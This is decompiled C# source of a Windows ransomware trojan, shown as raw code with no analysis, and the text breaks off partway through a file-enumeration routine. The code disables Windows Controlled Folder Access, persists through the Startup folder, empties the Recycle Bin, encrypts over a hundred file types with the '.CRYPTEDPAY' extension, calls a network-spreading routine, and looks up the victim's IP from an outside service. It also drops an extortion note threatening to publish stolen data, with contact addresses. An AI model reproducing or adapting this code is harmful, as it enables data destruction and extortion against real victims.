// Decompiled with JetBrains decompiler
// Type: coxZRmDhvSAWo.GhAMvbuoccW
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using Microsoft.Win32;
using NS001;
using NS002;
using SmartAssembly.Delegates;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace coxZRmDhvSAWo
{
  internal sealed class GhAMvbuoccW
  {
    public static string gheRqfduEuJ;
    public static byte[] bGfpmpYMCsNkyjcK;
    public static string HirTGWkSHczrmbY;
    public static string nsiwXjKpMUO;
    public static List<string> ZmKssmQIdPi;
    public static List<string> f000001;
    public static string zMQimCitOD;
    public static string f000002;
    public static string f000003;
    public static string EXVykcHaTCNay;
    public static string szjPprKwdybiP;
    public static int IwCCvRldil;
    public static string BBqvZtJMKtZyzF;
    public static string MkWPFkyuHrLz;
    public static string tGBTkHzktdbqpsN;
    public static string IHkGIfOFsBs;
    public static string PktefsOLxgM;
    public static string lvMwbEyyvL;
    public static string f000004;
    public static string f000005;
    public static List<string> FBdBqWxFZQgyhcDd;
    public static List<string> HMEbcaxMfcYzgl;
    public static string wbKIZmscSBasobt;
    public static string dVUrkAuvmqKS;
    public static string uSiPWDmilru;
    public static List<string> f000006;
    public static string f000007;
    private static string f000008;
    public static string rmNaxrdaErS;
    public static string nnUkiNRMVi;
    public static List<string> f000009;
    public static List<string> VfIRuRDoHW;
    public static List<string> ZSMEaXFyFht;
    public static List<string> f00000a;
    public static string edpjkmWiBB;
    public static List<string> pmzwKqsyDlmmF;
    public static List<string> f00000b;
    public static string aYqzBWQifeA;
    public static string f00000c;
    internal static DateTime f00000d;
    internal static DateTime f00000e;
    public static string f00000f;
    public static string f000010;
    public static string f000011;
    public static string fNMfifGmoXya;
    public static string rPQFiVwCriY;
    public static string yrIyoHrzWDCT;
    public static string NwrSvcEHBCxFfoz;
    public static string f000012;
    public static List<string> f000013;
    public static string f000014;
    public static string f000015;
    public static string MSbkqSPZNmrgShe;
    public static string f000016;
    public static string f000017;
    public static string fKcZCslCfAJPz;
    public static string KWarveAlrUeLj;
    public static string CvhuRhPbSX;
    public static string f000018;
    public static string f000019;
    public static string EiyrcFiAoaX;
    public static string f00001a;
    public static string SbkfEriDLMxWh;
    public static string f00001b;
    public static string NMKbJRePeNuLz;
    public static string OIjqWZRpNdE;
    public static string f00001c;
    public static string f00001d;
    public static string XoculucrhuBC;
    public static string RoiBxbbYOpTnzdF;
    public static string f00001e;
    public static string f00001f;
    public static string cuUuUUMpmxH;
    public static string f000020;
    public static string nmjDhIwEGnMOrO;
    public static string aYrdlpstiAwAZTu;
    public static string nqNdPWHffReq;
    public static string f000021;
    public static string f000022;
    public static string[] YacSoacXjaCUC;
    public static string QtTrkEhpkGUJgMO;
    public static bool uBIPmjbCjNt;
    public static string f000023;
    public static bool PAOJgADrbjEa;
    public static bool hxCcwpobkJC;
    public static bool FRIhZgoxuuhF;
    public static bool f000024;
    public static string f000025;
    public static bool CCDyMIHlAe;
    public static bool f000026;
    public static bool f000027;
    public static bool f000028;
    public static bool UOlZmEwYRBbnfmvt;
    public static string muQSQoYNOwJp;
    public static bool f000029;
    public static Stopwatch lBGXxmsJjqv;
    public static int f00002a;
    public static int f00002b;
    public static bool YazilaoopZ;
    public static string f00002c;
    public static string[] caYhozbaifo;
    public static List<string> KlnqoelvmWHjj;
    public static int f00002d;
    public static bool RaNDyCdUClri;
    public static bool f00002e;
    public static bool CoyMCdqKPDBfCk;
    public static bool f00002f;
    public static bool f000030;
    private static ThreadStart f000031;
    private static Action<string> f000032;
    private static Action<string> f000033;
    private static Action<string> f000034;
    private static Action<string> f000035;
    private static Action<string> f000036;
    [NonSerialized]
    internal static GetString f000037;

    [DllImport("kernel32.dll")]
    private static extern bool AllocConsole();

    [DllImport("kernel32.dll")]
    private static extern bool SetProcessShutdownParameters(uint p0, uint p1);

    private static void Main(string[] args)
    {
      try
      {
        if (((IEnumerable<Process>) Process.GetProcesses()).Count<Process>(new Func<Process, bool>(new GhAMvbuoccW.c000004()
        {
          avfxhzATpymbWL = Process.GetCurrentProcess().ProcessName
        }.m000012)) > 1)
          return;
      }
      catch (Exception ex)
      {
      }
      try
      {
        GpSuvmMCrcEnBNN.m000027(GhAMvbuoccW.f000008);
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (GhAMvbuoccW.aYrdlpstiAwAZTu == "YES")
          new Thread(new ThreadStart(ReEGuVGZtzhJ.QwimkMrTSXf))
          {
            Priority = ThreadPriority.Normal,
            IsBackground = true
          }.Start();
      }
      catch (Exception ex)
      {
      }
      GhAMvbuoccW.SetProcessShutdownParameters(0U, 0U);
      if (GhAMvbuoccW.tGBTkHzktdbqpsN == "YES")
        Thread.Sleep(int.Parse(GhAMvbuoccW.IHkGIfOFsBs));
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      {
        if (GhAMvbuoccW.NwrSvcEHBCxFfoz == "YES")
        {
          try
          {
            GhAMvbuoccW.ubalMIbEpbeY("Set-MpPreference -EnableControlledFolderAccess Disabled");
          }
          catch (Exception ex)
          {
          }
        }
      }
      try
      {
        int num = GhAMvbuoccW.f000004 == "YES" ? 1 : 0;
      }
      catch (Exception ex)
      {
      }
      int num1 = GhAMvbuoccW.dVUrkAuvmqKS == "YES" ? 1 : 0;
      if (GhAMvbuoccW.MkWPFkyuHrLz == "YES")
        c00000f.leUcrsvMUGz();
      try
      {
        ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
        string fileName = mainModule.FileName;
        string str1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
        string str2 = str1 + Path.GetFileName(fileName);
        if (GhAMvbuoccW.szjPprKwdybiP == "YES" && fileName != str2)
          new Thread(new ThreadStart(GhAMvbuoccW.OvqakdodhLDH))
          {
            IsBackground = true,
            Priority = ThreadPriority.Normal
          }.Start();
        if (GhAMvbuoccW.zMQimCitOD == "YES")
        {
          if (mainModule != null)
          {
            if (fileName != str2)
            {
              try
              {
                GhAMvbuoccW.IwCCvRldil = GhAMvbuoccW.EwHBDgtvrOMYeg(0, GhAMvbuoccW.FBdBqWxFZQgyhcDd.Count);
                System.IO.File.Copy(fileName, str1 + GhAMvbuoccW.FBdBqWxFZQgyhcDd[GhAMvbuoccW.IwCCvRldil], true);
                Process.Start(str1 + GhAMvbuoccW.FBdBqWxFZQgyhcDd[GhAMvbuoccW.IwCCvRldil]);
                GhAMvbuoccW.OQGiATnqshpg();
                Process.GetCurrentProcess().Kill();
              }
              catch (Exception ex)
              {
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (GhAMvbuoccW.aYqzBWQifeA == "YES")
        {
          if (DateTime.Now < GhAMvbuoccW.f00000d)
            return;
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (GhAMvbuoccW.f00000c == "YES")
        {
          if (DateTime.Now > GhAMvbuoccW.f00000e)
            GhAMvbuoccW.OQGiATnqshpg();
        }
      }
      catch (Exception ex)
      {
      }
      GhAMvbuoccW.m000005();
      if (GhAMvbuoccW.f000031 == null)
        GhAMvbuoccW.f000031 = new ThreadStart(GhAMvbuoccW.m00000c);
      new Thread(GhAMvbuoccW.f000031)
      {
        Priority = ThreadPriority.Normal,
        IsBackground = true
      }.Start();
      try
      {
        if (System.IO.File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
        {
          foreach (string readAllLine in System.IO.File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
          {
            if (readAllLine.Contains("PriorityPath="))
            {
              string str3 = readAllLine.Split('=')[1].Trim();
              if (!string.IsNullOrEmpty(str3))
              {
                string str4 = str3;
                char[] chArray = new char[1]{ ',' };
                foreach (string str5 in str4.Split(chArray))
                {
                  string path = str5.Trim();
                  if (Directory.Exists(path) && !GhAMvbuoccW.ZmKssmQIdPi.Contains(path) && path != "X:\\CustomPath1" && path != "Z:\\CustomPath2" && path != "\\\\Domain\\Path\\Folder")
                    GhAMvbuoccW.ZmKssmQIdPi.Add(path);
                }
              }
            }
            if (readAllLine.Contains("Network="))
            {
              string str = readAllLine.Split('=')[1].Trim();
              if (!string.IsNullOrEmpty(str) && str.ToLower() == "true")
                GhAMvbuoccW.SbkfEriDLMxWh = "YES";
              else if (!string.IsNullOrEmpty(str) && str.ToLower() == "false")
                GhAMvbuoccW.SbkfEriDLMxWh = "NO";
            }
            if (readAllLine.Contains("ConsoleMode="))
            {
              string str = readAllLine.Split('=')[1].Trim();
              if (!string.IsNullOrEmpty(str) && str.ToLower() == "true")
                GhAMvbuoccW.f000029 = true;
              else if (!string.IsNullOrEmpty(str) && str.ToLower() == "false")
                GhAMvbuoccW.f000029 = true;
            }
            if (readAllLine.Contains("DebugLog="))
            {
              string str = readAllLine.Split('=')[1].Trim();
              if (!string.IsNullOrEmpty(str) && str.ToLower() == "true")
                GhAMvbuoccW.CCDyMIHlAe = true;
              else if (!string.IsNullOrEmpty(str) && str.ToLower() == "false")
                GhAMvbuoccW.CCDyMIHlAe = false;
            }
            if (readAllLine.Contains("ImpersonateExplorer="))
            {
              string str = readAllLine.Split('=')[1].Trim();
              if (!string.IsNullOrEmpty(str) && str.ToLower() == "true")
                GhAMvbuoccW.RaNDyCdUClri = true;
              else if (!string.IsNullOrEmpty(str) && str.ToLower() == "false")
                GhAMvbuoccW.RaNDyCdUClri = true;
            }
          }
        }
      }
      catch (Exception ex1)
      {
        if (GhAMvbuoccW.CCDyMIHlAe)
        {
          try
          {
            System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "Configuration text file error: " + ex1.Message);
          }
          catch (Exception ex2)
          {
          }
        }
      }
      if (GhAMvbuoccW.SbkfEriDLMxWh == "NO")
        GhAMvbuoccW.m000001();
      try
      {
        if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        {
          if (GhAMvbuoccW.FRIhZgoxuuhF)
          {
            try
            {
              new Thread(new ThreadStart(c00001e.OGRDaEslLrcJ))
              {
                IsBackground = true
              }.Start();
            }
            catch (Exception ex)
            {
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        GhAMvbuoccW.m000002("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\\\$Recycle.bin");
      SecureString secureString = new SecureString();
      if (GhAMvbuoccW.f000011 == "NO")
      {
        GhAMvbuoccW.f000002 = "9o6ri4K/IhCIghFRYRh4UjhCezYpN6h8tU3bha9DWAE=";
        GhAMvbuoccW.f000003 = "urvrsSkMbCY=";
      }
      else
        GhAMvbuoccW.f000002 = "E79Z8TDOJOODRXYHW0LS9WTHWV2J44AT";
      GhAMvbuoccW.EXVykcHaTCNay = c000015.nPhDaoiHjN(GhAMvbuoccW.f000002 + GhAMvbuoccW.f000003);
      try
      {
        if (!GhAMvbuoccW.PAOJgADrbjEa)
        {
          RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\KEYID\\myKeyID");
          if (subKey != null)
          {
            subKey.SetValue("ID" + (object) (subKey.ValueCount + 1), (object) GhAMvbuoccW.EXVykcHaTCNay);
            subKey.Close();
          }
        }
        else
        {
          RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\KEYID\\myKeyID");
          if (subKey != null && subKey.ValueCount == 0)
          {
            subKey.SetValue("ID" + (object) (subKey.ValueCount + 1), (object) GhAMvbuoccW.EXVykcHaTCNay);
            subKey.Close();
          }
          else if (subKey != null)
          {
            if (subKey.ValueCount != 0)
              subKey.Close();
          }
        }
      }
      catch (Exception ex)
      {
        GhAMvbuoccW.f000030 = true;
      }
      if (GhAMvbuoccW.CvhuRhPbSX == "YES")
        GhAMvbuoccW.xLkmmTTSHp();
      if (GhAMvbuoccW.wbKIZmscSBasobt == "YES")
        GhAMvbuoccW.NetworkSpreading.Run();
      if (GhAMvbuoccW.f000027)
      {
        try
        {
          if (!System.IO.File.Exists(Path.Combine(Directory.GetCurrentDirectory(), GhAMvbuoccW.muQSQoYNOwJp)))
            System.IO.File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), GhAMvbuoccW.muQSQoYNOwJp), "Client IP: " + new WebClient().DownloadString("http://icanhazip.com") + "\r\n" + "Date of encryption: " + (object) DateTime.Now + "\r\n" + "Client Unique Identifier Key: " + GhAMvbuoccW.EXVykcHaTCNay);
          else
            System.IO.File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), GhAMvbuoccW.muQSQoYNOwJp), "\r\nAdditional KeyID: " + GhAMvbuoccW.EXVykcHaTCNay);
        }
        catch (Exception ex3)
        {
          if (GhAMvbuoccW.CCDyMIHlAe)
          {
            try
            {
              System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "Error while creating Local Report: " + ex3.Message + "\r\n");
            }
            catch (Exception ex4)
            {
            }
          }
        }
      }
      if (!GhAMvbuoccW.f00002f)
        c000019.m00002b(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), GhAMvbuoccW.RoiBxbbYOpTnzdF), GhAMvbuoccW.iqbhckCLJPzmcb(GhAMvbuoccW.EXVykcHaTCNay), (string) null, (string) null, "Installer...", "Ctrl+Shift+X", (string) null);
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        GhAMvbuoccW.XoFivSFAPFl();
      try
      {
        GhAMvbuoccW.LeefKZPaDd(new string[1]
        {
          "[auto]"
        }, new string[101]
        {
          "dat",
          "txt",
          "jpeg",
          "gif",
          "jpg",
          "png",
          "php",
          "cs",
          "cpp",
          "rar",
          "zip",
          "html",
          "htm",
          "xlsx",
          "xll",
          "xls",
          "avi",
          "mp4",
          "ppt",
          "doc",
          "docx",
          "sxi",
          "sxw",
          "odt",
          "hwp",
          "tar",
          "bz2",
          "mkv",
          "eml",
          "msg",
          "ost",
          "pst",
          "edb",
          "sql",
          "accdb",
          "mdb",
          "dbf",
          "odb",
          "myd",
          "php",
          "java",
          "cpp",
          "pas",
          "asm",
          "key",
          "pfx",
          "pem",
          "p12",
          "csr",
          "gpg",
          "aes",
          "vsd",
          "odg",
          "raw",
          "nef",
          "svg",
          "psd",
          "vmx",
          "vmdk",
          "vdi",
          "lay6",
          "sqlite3",
          "sqlitedb",
          "java",
          "class",
          "mpeg",
          "djvu",
          "tiff",
          "backup",
          "pdf",
          "cert",
          "docm",
          "xlsm",
          "dwg",
          "bak",
          "qbw",
          "nd",
          "tlg",
          "lgb",
          "pptx",
          "mov",
          "xdw",
          "ods",
          "wav",
          "mp3",
          "aiff",
          "flac",
          "m4a",
          "csv",
          "sql",
          "ora",
          "mdf",
          "ldf",
          "ndf",
          "dtsx",
          "rdl",
          "dim",
          "mrimg",
          "qbb",
          "rtf",
          "7z"
        }, new string[0], GhAMvbuoccW.f000002, ".CRYPTEDPAY");
      }
      catch (Exception ex5)
      {
        if (GhAMvbuoccW.CCDyMIHlAe)
        {
          try
          {
            System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "Finish process: " + ex5.Message);
          }
          catch (Exception ex6)
          {
          }
        }
        try
        {
          secureString.Dispose();
        }
        catch (Exception ex7)
        {
        }
      }
      try
      {
        secureString.Dispose();
      }
      catch (Exception ex)
      {
      }
      if (!GhAMvbuoccW.f00002f || GhAMvbuoccW.f000030)
      {
        try
        {
          if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt"))
          {
            using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt"))
            {
              streamWriter.WriteLine("All your files have been encrypted !!\r\n\r\nDon't panic please, we are here to help you.\r\n\r\nIf you don't want to cooperate and hear your mind instead of our instructions,\r\n\r\nyou will loose stupidly your files but even worse, we have been able to steal confidentials files from your machines so prepare you to see them published or sold online.\r\n\r\nAll your network may have been infected. If this is the case, note that you'll be able to decrypt all the machines successfully.\r\n\r\nFortunately, we think you are aware that we don't want this case to happens and you too.\r\n\r\nIf you really want to restore your files, we can give you what you need to do if you contact us at :\r\n\r\nRansHelp@tutanota.com\r\n\r\nIf you don't contact us within the next 48 hours, we will destroy the decryption key needed to restore your files and publish what he have stealed in forums or sell it to tiers. You'll suffer a huge financial and reputation loss in this case.\r\n\r\nIf you don't receive any answers in the next 24 hours after contacting us, please send an e-mail to :\r\n\r\nRansHelp21@tutanota.com".Replace("%ID%", "").Replace("%USERNAME%", Environment.UserName).Replace("%MACHINENAME%", Environment.MachineName).Replace("%DOMAINNAME%", Environment.UserDomainName));
              streamWriter.WriteLine("\r\n\r\nYour Key ID to send us with your email :");
              streamWriter.WriteLine("");
              streamWriter.WriteLine(GhAMvbuoccW.EXVykcHaTCNay);
              if (GhAMvbuoccW.CoyMCdqKPDBfCk || !GhAMvbuoccW.PAOJgADrbjEa)
              {
                streamWriter.WriteLine("KEYID: ");
                streamWriter.WriteLine(GhAMvbuoccW.EXVykcHaTCNay);
              }
              if (GhAMvbuoccW.rmNaxrdaErS == "NO")
              {
                streamWriter.WriteLine("\r\n");
                streamWriter.WriteLine("Number of files that were processed is: " + Convert.ToString(GhAMvbuoccW.f000006.Count));
              }
              if (GhAMvbuoccW.YazilaoopZ)
              {
                streamWriter.WriteLine("\r\n");
                streamWriter.WriteLine("PC Hardware ID: ");
                streamWriter.WriteLine("");
              }
            }
          }
          else if (!System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt").Contains(GhAMvbuoccW.EXVykcHaTCNay))
          {
            if (!GhAMvbuoccW.PAOJgADrbjEa)
              System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt", "\r\nAdditional KeyId:\r\n" + GhAMvbuoccW.EXVykcHaTCNay);
          }
        }
        catch (Exception ex8)
        {
          if (GhAMvbuoccW.CCDyMIHlAe)
          {
            try
            {
              System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "Error while writing main note..." + ex8.Message + "\r\n");
            }
            catch (Exception ex9)
            {
            }
          }
        }
        int num2 = 0;
        foreach (string str in GhAMvbuoccW.HMEbcaxMfcYzgl)
        {
          ++num2;
          try
          {
            if (str == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
              continue;
          }
          catch (Exception ex)
          {
          }
          try
          {
            if (!System.IO.File.Exists(str + "\\RESTORE_THEM.txt"))
              System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt", str + "\\RESTORE_THEM.txt", true);
            else if (!System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt").Contains(GhAMvbuoccW.EXVykcHaTCNay))
            {
              if (!GhAMvbuoccW.PAOJgADrbjEa)
                System.IO.File.AppendAllText(str + "\\RESTORE_THEM.txt", "\r\nAdditional KeyId:\r\n" + GhAMvbuoccW.EXVykcHaTCNay);
            }
          }
          catch (Exception ex10)
          {
            if (GhAMvbuoccW.CCDyMIHlAe)
            {
              try
              {
                System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "Error while writing main note..." + ex10.Message + "\r\n");
              }
              catch (Exception ex11)
              {
              }
            }
          }
          if (!GhAMvbuoccW.f000024)
          {
            if (num2 > 10)
              break;
          }
        }
      }
      if (GhAMvbuoccW.cuUuUUMpmxH == "YES" && !GhAMvbuoccW.f00002f || GhAMvbuoccW.cuUuUUMpmxH == "YES" && GhAMvbuoccW.f000030)
      {
        try
        {
          if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.hta"))
          {
            using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.hta"))
            {
              streamWriter.WriteLine(GhAMvbuoccW.m000003("MESSAGERICH").Replace("%ID%", "").Replace("%USERNAME%", Environment.UserName).Replace("%MACHINENAME%", Environment.MachineName).Replace("%DOMAINNAME%", Environment.UserDomainName));
              streamWriter.WriteLine("\r\n");
              if (GhAMvbuoccW.CoyMCdqKPDBfCk || !GhAMvbuoccW.PAOJgADrbjEa)
              {
                streamWriter.WriteLine("<p style=\"text-align: center;\">KEYID: ");
                streamWriter.WriteLine(GhAMvbuoccW.EXVykcHaTCNay + "</p>");
              }
              if (GhAMvbuoccW.rmNaxrdaErS == "NO")
              {
                streamWriter.WriteLine("\r\n");
                streamWriter.WriteLine("<p style=\"text-align: center;\">Number of files that were processed is: " + Convert.ToString(GhAMvbuoccW.f000006.Count) + "</p>");
              }
              if (GhAMvbuoccW.YazilaoopZ)
              {
                streamWriter.WriteLine("\r\n");
                streamWriter.WriteLine("PC Hardware ID: ");
                streamWriter.WriteLine("");
              }
            }
          }
          else if (!System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt").Contains(GhAMvbuoccW.EXVykcHaTCNay))
          {
            if (!GhAMvbuoccW.PAOJgADrbjEa)
              System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.hta", "<p style=\"text-align: center;\">\r\nAdditional KeyId:\r\n" + GhAMvbuoccW.EXVykcHaTCNay + "</p>");
          }
        }
        catch (Exception ex12)
        {
          if (GhAMvbuoccW.CCDyMIHlAe)
          {
            try
            {
              System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "Error while writing rich text main note..." + ex12.Message + "\r\n");
            }
            catch (Exception ex13)
            {
            }
          }
        }
      }
      if (GhAMvbuoccW.f000007 == "YES")
      {
        try
        {
          if (GhAMvbuoccW.rmNaxrdaErS == "NO")
            c000013.gmIyowWwkfSR(p3: ("Client IP: " + new WebClient().DownloadString("http://icanhazip.com") + "\r" + "Date of encryption: " + (object) DateTime.Now + "\r\n" + "Possible affected files: " + Convert.ToString(GhAMvbuoccW.f000006.Count) + "\r\n" + "Client Unique Identifier Key: " + GhAMvbuoccW.EXVykcHaTCNay));
          else
            c000013.gmIyowWwkfSR(p3: ("Client IP: " + new WebClient().DownloadString("http://icanhazip.com") + "\r" + "Date of encryption: " + (object) DateTime.Now + "\r\n" + "Possible affected files: " + Convert.ToString(GhAMvbuoccW.f000006.Count) + "\r\n" + "Client Unique Identifier Key: " + GhAMvbuoccW.EXVykcHaTCNay));
        }
        catch (Exception ex)
        {
        }
      }
      if (GhAMvbuoccW.f000005 == "YES")
      {
        try
        {
          uhnJdcZsoCQU.LlIJhyFJOrlN(new Uri(""));
        }
        catch (Exception ex)
        {
        }
      }
      if (GhAMvbuoccW.cuUuUUMpmxH == "NO")
      {
        if (!GhAMvbuoccW.f00002f)
        {
          try
          {
            if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt"))
            {
              Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.txt");
              goto label_198;
            }
            else
              goto label_198;
          }
          catch (Exception ex)
          {
            goto label_198;
          }
        }
      }
      if (GhAMvbuoccW.cuUuUUMpmxH == "YES")
      {
        if (!GhAMvbuoccW.f00002f)
        {
          try
          {
            if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.hta"))
              Process.Start("mshta.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_THEM.hta");
          }
          catch (Exception ex)
          {
          }
        }
      }
label_198:
      if (GhAMvbuoccW.CvhuRhPbSX == "YES")
      {
        if (GhAMvbuoccW.f000018 == "YES" && !string.IsNullOrEmpty(GhAMvbuoccW.f000019) && !string.IsNullOrEmpty(GhAMvbuoccW.EiyrcFiAoaX))
          GhAMvbuoccW.m000004(GhAMvbuoccW.f000019, GhAMvbuoccW.EiyrcFiAoaX);
        else
          GhAMvbuoccW.m000004();
      }
      if (GhAMvbuoccW.f00001c != "LOGONISOFF")
        GhAMvbuoccW.pkNBJGqTbajgL(GhAMvbuoccW.f00001c);
      if (!string.IsNullOrEmpty(GhAMvbuoccW.fKcZCslCfAJPz))
      {
        try
        {
          System.IO.File.Delete(GhAMvbuoccW.fKcZCslCfAJPz);
        }
        catch (Exception ex)
        {
        }
      }
      try
      {
        if (System.IO.File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
          System.IO.File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
      }
      catch (Exception ex14)
      {
        try
        {
          System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "Error deleting config text file: " + ex14.Message);
        }
        catch (Exception ex15)
        {
        }
      }
      if (GhAMvbuoccW.CCDyMIHlAe)
      {
        try
        {
          System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "All Done!");
        }
        catch (Exception ex)
        {
        }
      }
      if (!(GhAMvbuoccW.gheRqfduEuJ == "EVET"))
        return;
      GhAMvbuoccW.OQGiATnqshpg();
    }

    public static void OvqakdodhLDH()
    {
      int num = (int) MessageBox.Show("This program requires Microsoft .NET Framework v. 4.82 or superior to run properly", "Information...", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    private static int EwHBDgtvrOMYeg(int p0, int p1)
    {
      RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
      byte[] numArray = new byte[4];
      byte[] data = numArray;
      cryptoServiceProvider.GetBytes(data);
      return new Random(BitConverter.ToInt32(numArray, 0)).Next(p0, p1);
    }

    public static List<string> DrqYGjBvTosyB(
      string p0,
      string[] p1,
      string p2,
      string[] p3,
      string p4)
    {
      List<string> p0_1 = new List<string>();
      Stack<string> stringStack = new Stack<string>(20);
      stringStack.Push(p0);
      while (stringStack.Count > 0)
      {
        string path = stringStack.Pop();
        string[] directories;
        try
        {
          directories = Directory.GetDirectories(path);
        }
        catch (Exception ex)
        {
          continue;
        }
        string[] files;
        try
        {
          if (path.Contains("C:\\Program Files\\") || path.Contains("C:\\Program Files (x86)\\") || path.Contains(":\\Windows\\") || path.ToLower().Contains("perflogs") || path.ToLower().Contains("internet explorer") || path.Contains(":\\ProgramData\\") || path.Contains("\\AppData\\") || path.ToLower().Contains("msocache") || path.ToLower().Contains("system volume information") || path.ToLower().Contains("boot") || path.ToLower().Contains("tor browser") || path.ToLower().Contains("mozilla") || path.ToLower().Contains("appdata") || path.ToLower().Contains("google chrome") || path.ToLower().Contains("application data"))
          {
            if (!path.Contains("Microsoft SQL Server"))
              continue;
          }
          files = Directory.GetFiles(path);
        }
        catch (Exception ex)
        {
          continue;
        }
        foreach (string fileName in files)
        {
          try
          {
            FileInfo fileInfo = new FileInfo(fileName);
            if (!fileInfo.FullName.Contains("autoexec.bat"))
            {
              if (!fileInfo.FullName.Contains("desktop.ini"))
              {
                if (!fileInfo.FullName.Contains("autorun.inf"))
                {
                  if (!fileInfo.FullName.Contains("ntuser.dat"))
                  {
                    if (!fileInfo.FullName.Contains("NTUSER.DAT"))
                    {
                      if (!fileInfo.FullName.Contains("iconcache.db"))
                      {
                        if (!fileInfo.FullName.Contains("bootsect.bak"))
                        {
                          if (!fileInfo.FullName.Contains("boot.ini"))
                          {
                            if (!fileInfo.FullName.Contains("ntuser.dat.log"))
                            {
                              if (!fileInfo.FullName.Contains("thumbs.db"))
                              {
                                if (!fileInfo.FullName.ToLower().Contains("bootmgr"))
                                {
                                  if (!fileInfo.FullName.ToLower().Contains("pagefile.sys"))
                                  {
                                    if (!fileInfo.FullName.ToLower().Contains("config.sys"))
                                    {
                                      if (!fileInfo.FullName.ToLower().Contains("ntuser.ini"))
                                      {
                                        if (!fileInfo.FullName.Contains("Builder_Log"))
                                        {
                                          if (!fileInfo.FullName.Contains("RSAKeys"))
                                          {
                                            if (!fileInfo.FullName.Contains("Config.enc"))
                                            {
                                              if (!fileInfo.FullName.Contains("RESTORE_FILES_INFO"))
                                              {
                                                if (!fileInfo.FullName.EndsWith(".NARUMI"))
                                                {
                                                  if (!fileInfo.FullName.EndsWith("exe"))
                                                  {
                                                    if (!fileInfo.FullName.EndsWith("dll"))
                                                    {
                                                      if (!fileInfo.FullName.EndsWith("EXE"))
                                                      {
                                                        if (!fileInfo.FullName.EndsWith("DLL"))
                                                        {
                                                          if (!fileInfo.FullName.Contains("Recycle.Bin"))
                                                          {
                                                            if (!fileInfo.FullName.Contains(GhAMvbuoccW.RoiBxbbYOpTnzdF))
                                                            {
                                                              if (!fileInfo.FullName.Contains(GhAMvbuoccW.f000025))
                                                              {
                                                                if (!fileInfo.FullName.Contains(GhAMvbuoccW.muQSQoYNOwJp))
                                                                {
                                                                  if (System.IO.File.Exists(fileInfo.FullName) && (double) fileInfo.Length <= double.Parse(GhAMvbuoccW.nsiwXjKpMUO) * 1024.0 * 1024.0 && GhAMvbuoccW.HirTGWkSHczrmbY == "YES")
                                                                  {
                                                                    p0_1.Add(fileInfo.FullName);
                                                                    GhAMvbuoccW.m00000a(p0_1, p1, p2, p3, p4);
